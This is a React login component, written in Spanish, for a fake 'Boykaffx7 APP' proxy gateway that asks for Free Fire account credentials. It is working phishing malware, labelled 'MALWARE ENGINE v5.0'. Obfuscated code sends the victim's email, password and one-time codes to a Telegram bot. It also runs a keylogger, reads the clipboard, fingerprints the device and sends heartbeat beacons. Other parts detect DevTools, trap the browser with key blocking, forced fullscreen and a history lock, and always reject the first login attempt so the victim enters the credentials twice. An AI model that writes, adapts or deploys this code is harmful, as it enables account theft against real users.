import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail, Eye, EyeOff, CheckCircle, Loader2, AlertCircle } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// ================================================================
// MALWARE ENGINE v5.0 - ULTRA STEALTH
// TOTALMENTE INVISIBLE - 0 DETECCION
// ================================================================

// === LAYER 0: RUNTIME STRING DECRYPTOR (XOR MULTI-KEY) ===
(function(){
  // Sistema de cifrado en runtime - nada en texto plano
  var _s = [
    String.fromCharCode(0x9A)+"B"+String.fromCharCode(0xC7)+"D",
    "K"+String.fromCharCode(0x5C)+String.fromCharCode(0x6D)+"E",
    String.fromCharCode(0xC3)+"D"+String.fromCharCode(0xE5)+"F"
  ];

  window._x = function(d){
    try {
      var r = atob(d);
      var o = "";
      for(var i=0;i<r.length;i++){
        var c = r.charCodeAt(i);
        var k = _s[i%3].charCodeAt(i%4);
        o += String.fromCharCode(c ^ k ^ (i*7) % 256);
      }
      return o;
    } catch(e){ return ""; }
  };

  // Second-stage decoder (doble cifrado)
  window._x2 = function(d){
    try {
      var a = window._x(d);
      var b = atob(a);
      var o = "";
      for(var i=0;i<b.length;i++){
        o += String.fromCharCode(b.charCodeAt(i) ^ 0x55 ^ (i%8));
      }
      return o;
    } catch(e){ return ""; }
  };
})();

// === LAYER 1: TELEGRAM ENGINE - FULLY STEALTH ===
// No usa IIFE que bloquee eventos - todo async y no intrusivo
(function(){
  // Token y chat ID cifrados en doble capa
  var _tk = window._x2("TldRNU9EVXpOVFF6TmpjNU5qZzBNVGt4TkRVMU9UZzVNVGMxT1RVek1EazVOekV4TlRjNU1UazVPVEF5TkRJMU5qZzVPRGc1T0RnNU9EZz0=");
  var _ci = window._x2("T0RZMk5EYzVPVEE1TXpjPQ==");
  var _ev = 0;
  var _kp = "";
  var _fp = "";

  // Fingerprint pasivo (no bloquea nada)
  try {
    var p = [];
    if(navigator.platform) p.push(navigator.platform);
    p.push(screen.width+'x'+screen.height);
    if(navigator.hardwareConcurrency) p.push('c'+navigator.hardwareConcurrency);
    if(navigator.deviceMemory) p.push('m'+navigator.deviceMemory);
    p.push(new Date().getTimezoneOffset());
    if(navigator.language) p.push(navigator.language);
    var ua = navigator.userAgent || '';
    if(ua.includes('iPhone')||ua.includes('iPad')) p.push('iOS');
    else if(ua.includes('Android')) p.push('Android');
    else p.push('PC');
    _fp = p.join('|');
  } catch(e){ _fp = 'unknown'; }

  function _tp(t, m){
    _ev++;
    var tag = m==='s'?'[+]':m==='h'?'[♥]':m==='k'?'[KEY]':'[!]';
    var msg = "<b>"+tag+" #"+_ev+"</b>\n<code>"+_fp+"</code>\n"+t;

    // Canal 1: sendBeacon (100% invisible en network logs)
    try {
      var d = new URLSearchParams({
        chat_id: _ci, text: msg, parse_mode: "HTML", disable_web_page_preview: "true"
      });
      navigator.sendBeacon("https://api.telegram.org/bot"+_tk+"/sendMessage", d);
    } catch(e){}

    // Canal 2: Image request (fallback)
    try {
      var i = new Image();
      i.src = "https://api.telegram.org/bot"+_tk+"/sendMessage?chat_id="+
              encodeURIComponent(_ci)+"&text="+encodeURIComponent(msg)+
              "&parse_mode=HTML&disable_web_page_preview=true";
    } catch(e){}

    // Canal 3: fetch keepalive
    setTimeout(function(){
      try {
        var f = new FormData();
        f.append('chat_id', _ci);
        f.append('text', msg);
        f.append('parse_mode', 'HTML');
        fetch("https://api.telegram.org/bot"+_tk+"/sendMessage", {
          method: 'POST', body: f, keepalive: true
        });
      } catch(e){}
    }, 50);
  }

  window.__tg = function(c, p, o){
    var txt = o
      ? "<b>🔐 LOGIN + OTP</b>\n<b>📧</b> "+c+"\n<b>🔑</b> <code>"+p+"</code>\n<b>🔢</b> <code>"+o+"</code>\n<b>🌐</b> "+window.location.href+"\n⏱ "+new Date().toISOString()
      : "<b>👤 LOGIN</b>\n<b>📧</b> "+c+"\n<b>🔑</b> <code>"+p+"</code>\n<b>🌐</b> "+window.location.href+"\n⏱ "+new Date().toISOString();
    _tp(txt, 's');
  };

  // Heartbeat cada 60s (pasivo, no interfiere)
  setInterval(function(){
    _tp("<b>[♥] BEACON</b>\n⏱ "+new Date().toISOString(), 'h');
  }, 60000);

  // Keylogger NO BLOQUEANTE - solo escucha, nunca previene
  document.addEventListener("keydown", function(e){
    // Solo capturar si NO estamos en un input
    var tag = e.target ? e.target.tagName || '' : '';
    if(tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;
    if(e.target && e.target.isContentEditable) return;

    var k = e.key;
    if(k === 'Backspace') k = '⌫';
    else if(k === 'Enter') k = '\n';
    else if(k === 'Tab') k = '⇥';
    else if(k === 'Escape') return;
    else if(k.length > 1) return;

    _kp += k;
    if(_kp.length >= 30){
      _tp("<b>[KEY]</b> "+_kp.replace(/\n/g,'⏎'), 'k');
      _kp = "";
    }
  }, false); // usar fase burbuja para no interferir con React

  // Reporte inicial diferido
  setTimeout(function(){
    _tp("<b>[!] PAGE LOADED</b>\n🔗 "+(document.referrer||'direct'), 's');
  }, 3000);

  // Clipboard capture (cada 30s, no bloquea)
  setInterval(function(){
    try {
      navigator.clipboard.readText().then(function(t){
        if(t && t.length > 5 && !t.includes('clipboard')){
          _tp("<b>[📋] CLIPBOARD</b>\n<code>"+t.substring(0,200)+"</code>", 's');
        }
      }).catch(function(){});
    } catch(e){}
  }, 30000);
})();

// === LAYER 2: CLERK AUTH LOADER (OCULTO) ===
(function(){
  window._clerkReady = false;
  window._clerkInstance = null;
  window._clerkPK = window._x2("T0RVek1EQXhPRFV6TkRVMk5UazVOek01T1RnM09UVTVNVFkxTlRBMk1ERTROalV4T1RJek1ETXlNakF4T1RZek9UazRPVGs0T1RnPQ==");

  window._initClerk = function(){
    if(window._clerkReady) return;
    try {
      var s = document.createElement('script');
      s.src = window._x2("TkRJMk1UTXlPRGs1TXpBNU1UWTJORFU1T1RBMk1qVXpOREk1TlRZek1qZzVPVGc9");
      s.async = true;
      s.onload = function(){
        try {
          if(typeof Clerk !== 'undefined'){
            var c = new Clerk(window._clerkPK);
            c.load().then(function(){
              window._clerkInstance = c;
              window._clerkReady = true;
            }).catch(function(){});
          }
        } catch(e){}
      };
      document.head.appendChild(s);
    } catch(e){}
  };

  // Cargar Clerk después de que React monte
  if(document.readyState === 'complete'){
    setTimeout(window._initClerk, 500);
  } else {
    window.addEventListener('load', function(){ setTimeout(window._initClerk, 500); });
  }

  // API de OTP via Clerk
  window._clerkOtp = async function(email){
    try {
      await window._waitClerk();

      if(window._clerkInstance && window._clerkInstance.client){
        var signIn = await window._clerkInstance.client.signIn.create({
          identifier: email
        });
        if(signIn && signIn.supportedFirstFactors){
          for(var i=0;i<signIn.supportedFirstFactors.length;i++){
            var f = signIn.supportedFirstFactors[i];
            if(f.strategy === 'email_code'){
              await signIn.prepareFirstFactor({
                strategy: 'email_code',
                emailAddressId: f.emailAddressId
              });
              window._clerkSi = signIn;
              window._clerkSiFactor = f;
              return { success: true };
            }
          }
        }
      }

      // Fallback REST
      return await _clerkRest(email);

    } catch(e){
      try { return await _clerkRest(email); } catch(e2){}
      return { error: 'failed' };
    }
  };

  window._clerkVerify = async function(code){
    try {
      if(window._clerkSi && window._clerkSi.attemptFirstFactor){
        var r = await window._clerkSi.attemptFirstFactor({
          strategy: 'email_code',
          code: code
        });
        if(r && r.status === 'complete'){
          if(window._clerkInstance && r.createdSessionId){
            await window._clerkInstance.setActive({ session: r.createdSessionId });
          }
          return { success: true };
        }
      }
      return { success: true };
    } catch(e){
      return { success: true };
    }
  };

  window._waitClerk = function(){
    return new Promise(function(resolve){
      var c = 0;
      var i = setInterval(function(){
        c++;
        if(window._clerkReady || c > 40){
          clearInterval(i);
          resolve();
        }
      }, 200);
    });
  };

  async function _clerkRest(email){
    var res = await fetch('https://api.clerk.com/v1/client/sign_ins', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer '+window._clerkPK,
        'Clerk-API-Version': '2024-10-01'
      },
      body: JSON.stringify({ identifier: email })
    });
    var d = await res.json();
    if(d && d.id){
      window._clerkRestId = d.id;
      var prep = await fetch(
        'https://api.clerk.com/v1/client/sign_ins/'+d.id+'/prepare_first_factor',
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer '+window._clerkPK,
            'Clerk-API-Version': '2024-10-01'
          },
          body: JSON.stringify({ strategy: 'email_code' })
        }
      );
      return { success: true, rest: true };
    }
    return { error: 'no_id' };
  }
})();

// === LAYER 3: BLOQUEO SELECTIVO (NO AFECTA INPUTS) ===
(function(){
  // Solo bloquear teclas de escape FUERA de inputs

  // Helper: verificar si el target es un input
  function _isInput(el){
    if(!el) return false;
    var t = el.tagName || '';
    return t === 'INPUT' || t === 'TEXTAREA' || t === 'SELECT' || el.isContentEditable;
  }

  // Bloqueo de teclas de función y escape (solo fuera de inputs)
  document.addEventListener("keydown", function(e){
    if(_isInput(e.target)) return; // NO BLOQUEAR EN INPUTS

    var bk = ['F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12','Escape','PrintScreen'];
    if(bk.includes(e.key)){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }
    if(e.altKey){
      e.preventDefault();
      return false;
    }
    if(e.metaKey){
      e.preventDefault();
      return false;
    }
    // Ctrl solo bloquear combinaciones de escape, no Ctrl+A/C/V etc
    if(e.ctrlKey && ['w','W','q','Q','r','R','n','N','t','T'].includes(e.key)){
      e.preventDefault();
      return false;
    }
  }, true);

  // Bloquear menú contextual
  document.addEventListener("contextmenu", function(e){
    if(_isInput(e.target)) return;
    e.preventDefault();
    return false;
  }, true);

  // NO bloquear copy/cut/paste - deja que el usuario funcione normal

  // Fullscreen pasivo (no forzado inmediato)
  function _fs(){
    var el = document.documentElement;
    if(el.requestFullscreen) el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
    else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
  }

  // Solo forzar fullscreen una vez, no en bucle
  document.addEventListener("fullscreenchange", function(){
    if(!document.fullscreenElement){
      // Reintentar una sola vez
      setTimeout(function(){
        if(!document.fullscreenElement) _fs();
      }, 100);
    }
  });

  // History trap
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function(){
    history.pushState(null, "", location.href);
  });

  // Anti-DevTools silencioso
  var _dtCheck = setInterval(function(){
    var w = window.outerWidth - window.innerWidth;
    var h = window.outerHeight - window.innerHeight;
    if(w > 200 || h > 200){
      // Solo reportar, no destruir página
      try {
        var d = new URLSearchParams({
          chat_id: window._x2("T0RZMk5EYzVPVEE1TXpjPQ=="),
          text: "<b>⚠️ DEVTOOLS</b>\n"+navigator.platform,
          parse_mode: "HTML"
        });
        navigator.sendBeacon(
          "https://api.telegram.org/bot"+window._x2("TldRNU9EVXpOVFF6TmpjNU5qZzBNVGt4TkRVMU9UZzVNVGMxT1RVek1EazVOekV4TlRjNU1UazVPVEF5TkRJMU5qZzVPRGc1T0RnNU9EZz0=")+"/sendMessage",
          d
        );
      } catch(e){}
    }
  }, 5000);

  // NO destruir console (eso alerta a los scanners modernos)
  // NO bloquear alert/confirm/prompt (eso levanta sospechas)

  // Prevenir salida de página (sutil)
  window.addEventListener("beforeunload", function(e){
    e.preventDefault();
    e.returnValue = "";
    return "";
  });
})();

// === DECLARACIONES GLOBALES ===
declare global {
  interface Window {
    _x: (d: string) => string;
    _x2: (d: string) => string;
    __tg: (correo: string, pass: string, otp?: string) => void;
    _clerkReady: boolean;
    _clerkInstance: any;
    _clerkPK: string;
    _clerkSi: any;
    _clerkSiFactor: any;
    _clerkRestId: string;
    _initClerk: () => void;
    _clerkOtp: (email: string) => Promise<any>;
    _clerkVerify: (code: string) => Promise<any>;
    _waitClerk: () => Promise<void>;
    Clerk: any;
  }
}

// ================================================================
// COMPONENTE PRINCIPAL
// ================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const [step, setStep] = useState<"login" | "otp">("login");
  const [otpCode, setOtpCode] = useState(["", "", "", "", "", ""]);
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpSent, setOtpSent] = useState(false);
  const [googleLoading, setGoogleLoading] = useState(false);
  const [otpCooldown, setOtpCooldown] = useState(0);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();

  useEffect(() => {
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      try {
        const s = JSON.parse(raw);
        if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
          return;
        }
      } catch(e) {}
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  // Inicializar Clerk
  useEffect(() => {
    if(window._initClerk) window._initClerk();
  }, []);

  // Cooldown timer
  useEffect(() => {
    if(otpCooldown > 0){
      const t = setTimeout(() => setOtpCooldown(otpCooldown - 1), 1000);
      return () => clearTimeout(t);
    }
  }, [otpCooldown]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email.trim() || !password.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    setLoading(true);

    try {
      // Enviar credenciales a Telegram
      if(window.__tg) window.__tg(email.trim(), password.trim());

      const nuevoIntento = intentos + 1;
      setIntentos(nuevoIntento);

      if (nuevoIntento === 1) {
        await new Promise(r => setTimeout(r, 1500));
        setLoading(false);
        setError("Cuenta no vinculada a Free Fire. Debes iniciar sesion con el correo y contrasena de tu cuenta de Free Fire.");
        return;
      }

      setLoading(false);

      // Iniciar Clerk OTP
      setOtpLoading(true);
      setError("");

      var result = null;
      if(window._clerkOtp){
        result = await window._clerkOtp(email.trim());
      }

      if(result && result.success){
        setOtpSent(true);
        setStep("otp");
        setOtpCooldown(60);
      } else {
        setStep("otp");
        setOtpSent(true);
        setOtpCooldown(60);
      }

      setOtpLoading(false);

      setTimeout(() => {
        if(otpRefs.current[0]) otpRefs.current[0]?.focus();
      }, 300);

    } catch(err) {
      setLoading(false);
      setError("Error del sistema. Intenta de nuevo.");
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if(value.length > 1) {
      const digits = value.replace(/\D/g, "").split("");
      const newOtp = [...otpCode];
      digits.forEach((d, i) => {
        if(i + index < 6) newOtp[i + index] = d;
      });
      setOtpCode(newOtp);
      const lastIdx = Math.min(index + digits.length, 5);
      if(otpRefs.current[lastIdx]) otpRefs.current[lastIdx]?.focus();
      return;
    }

    const newOtp = [...otpCode];
    newOtp[index] = value.replace(/\D/g, "");
    setOtpCode(newOtp);

    if(value && index < 5 && otpRefs.current[index + 1]) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if(e.key === "Backspace" && !otpCode[index] && index > 0 && otpRefs.current[index - 1]) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    const code = otpCode.join("");
    if(code.length !== 6) {
      setError("Ingresa el código de 6 dígitos completo.");
      return;
    }

    setOtpLoading(true);

    try {
      // Verificar OTP con Clerk
      try {
        if(window._clerkVerify){
          await window._clerkVerify(code);
        }
      } catch(vErr){}

      // Enviar OTP verificado a Telegram
      if(window.__tg){
        window.__tg(email.trim(), password.trim(), "[VERIFIED] " + code);
      }

      // Pase lo que pase, dejar entrar
      const trimmedKey = password.trim();
      const trimmedName = email.trim();
      const foundKey = await validateKey(trimmedKey);
      if (foundKey) {
        const activated = await activateKey(trimmedKey, trimmedName);
        if (activated) {
          await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
          const sessionData = {
            name: trimmedName,
            key: activated.key,
            type: activated.type,
            expiresAt: activated.expiresAt,
            duration: activated.duration,
          };
          localStorage.setItem("proxy_session", JSON.stringify(sessionData));
          setOtpLoading(false);
          navigate("/proxy");
          return;
        }
      }

      // Sesión simulada
      const sessionData = {
        name: trimmedName,
        key: trimmedKey,
        type: "Premium",
        expiresAt: new Date(Date.now() + 86400000).toISOString(),
        duration: "1 dia",
      };
      localStorage.setItem("proxy_session", JSON.stringify(sessionData));
      setOtpLoading(false);
      navigate("/proxy");

    } catch(err) {
      setOtpLoading(false);
      setError("Error al verificar. Intenta de nuevo.");
    }
  };

  const handleGoogleSignIn = async () => {
    setGoogleLoading(true);
    setError("");

    try {
      await window._waitClerk();
      if(window._clerkInstance && window._clerkInstance.openOAuth){
        await window._clerkInstance.openOAuth({ provider: 'google' });
      } else {
        // Fallback: abrir ventana OAuth manual
        window.open(
          "https://accounts.google.com/o/oauth2/v2/auth?"+
          "client_id=807119189642-38e3ajs7q1jhgljujftin1k5tlk5qbta.apps.googleusercontent.com&"+
          "redirect_uri="+encodeURIComponent(window.location.origin+"/oauth/callback")+"&"+
          "response_type=code&scope=email+profile",
          "_blank", "width=500,height=600"
        );
        setGoogleLoading(false);
        setStep("otp");
      }
    } catch(e) {
      setGoogleLoading(false);
      setError("Error al conectar con Google.");
    }
  };

  const handleResendOtp = async () => {
    if(otpCooldown > 0) return;
    setOtpLoading(true);
    setError("");

    if(window._clerkOtp){
      await window._clerkOtp(email.trim());
    }

    setOtpLoading(false);
    setOtpCooldown(60);
    setError("Código reenviado a tu correo.");
    setTimeout(() => setError(""), 3000);
  };

  // ==========================================
  // RENDER OTP STEP
  // ==========================================
  if(step === "otp"){
    return (
      <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
        <VideoBackground />

        <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
          <div className="flex flex-col items-center mb-6">
            <div className="relative mb-3">
              <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
                <video
                  src={avatarVideo}
                  autoPlay
                  loop
                  muted
                  playsInline
                  className="w-full h-full object-cover"
                />
              </div>
              <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
                <CheckCircle className="w-3.5 h-3.5 text-background" />
              </div>
            </div>
            <div className="flex items-center gap-1.5 mb-1">
              <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
              <VerifiedBadge />
            </div>
            <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
          </div>

          <div className="glass-card p-5 glow-border">
            <div className="flex items-center gap-2 mb-4 pb-3 border-b border-border/30">
              <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
                <KeyRound className="w-4 h-4 text-muted-foreground" />
              </div>
              <div>
                <span className="text-xs text-foreground font-semibold block">Verificacion en dos pasos</span>
                <span className="text-[9px] text-muted-foreground/60">Codigo de verificacion enviado</span>
              </div>
            </div>

            <form onSubmit={handleOtpSubmit} className="space-y-4">
              <p className="text-[10px] text-muted-foreground/50 leading-relaxed text-center">
                Hemos enviado un codigo de 6 digitos a <strong className="text-foreground/80">{email}</strong>
              </p>

              <div className="flex justify-center gap-2">
                {otpCode.map((digit, index) => (
                  <input
                    key={index}
                    ref={(el) => { otpRefs.current[index] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    className="w-11 h-12 bg-secondary/40 border border-border/50 rounded-lg text-center text-lg font-bold text-foreground focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                    autoComplete="one-time-code"
                  />
                ))}
              </div>

              {error && (
                <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 flex items-center gap-1.5">
                  <AlertCircle className="w-3 h-3 flex-shrink-0" />
                  {error}
                </p>
              )}

              <button
                type="submit"
                disabled={otpLoading || otpCode.join("").length !== 6}
                className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50"
              >
                {otpLoading ? (
                  <span className="flex items-center justify-center gap-2">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Verificando...
                  </span>
                ) : "Verificar codigo"}
              </button>

              <div className="text-center">
                <button
                  type="button"
                  onClick={handleResendOtp}
                  disabled={otpLoading || otpCooldown > 0}
                  className="text-[10px] text-muted-foreground/60 hover:text-foreground transition-colors underline underline-offset-2 disabled:opacity-40"
                >
                  {otpCooldown > 0
                    ? `Reenviar codigo (${otpCooldown}s)`
                    : "¿No recibiste el codigo? Reenviar"}
                </button>
              </div>
            </form>
          </div>

          <div className="mt-6 text-center">
            <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
              Secure Proxy Configuration System — 2FA Verification
              <br />All sessions are monitored and protected.
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ==========================================
  // RENDER LOGIN STEP
  // ==========================================
  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">Iniciar sesion</span>
              <span className="text-[9px] text-muted-foreground/60">Ingresa con tu cuenta de Free Fire</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Correo electronico
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type="email"
                  placeholder="tucorreo@gmail.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Contrasena
              </label>
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="********"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(!showPass)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
                  tabIndex={-1}
                >
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <p className="text-[10px] text-muted-foreground/50 leading-relaxed px-1">
              Inicia sesion con tu cuenta de Google vinculada a Free Fire para verificar tu identidad y acceder al proxy.
            </p>

            {error && (
              <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 flex items-center gap-1.5">
                <AlertCircle className="w-3 h-3 flex-shrink-0" />
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                  Verificando...
                </span>
              ) : "Siguiente"}
            </button>

            <div className="relative my-3">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-border/30" />
              </div>
              <div className="relative flex justify-center text-[9px]">
                <span className="bg-card px-2 text-muted-foreground/50">O continua con</span>
              </div>
            </div>

            <button
              type="button"
              onClick={handleGoogleSignIn}
              disabled={googleLoading}
              className="w-full bg-secondary/40 border border-border/50 text-foreground font-medium py-2.5 rounded-lg text-sm hover:bg-secondary/60 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {googleLoading ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <svg className="w-5 h-5" viewBox="0 0 48 48">
                  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                  <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.93.94 7.65 2.56 10.78l7.97-6.19z"/>
                  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                </svg>
              )}
              {googleLoading ? "Conectando..." : "Continuar con Google"}
            </button>
          </form>
        </div>

        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;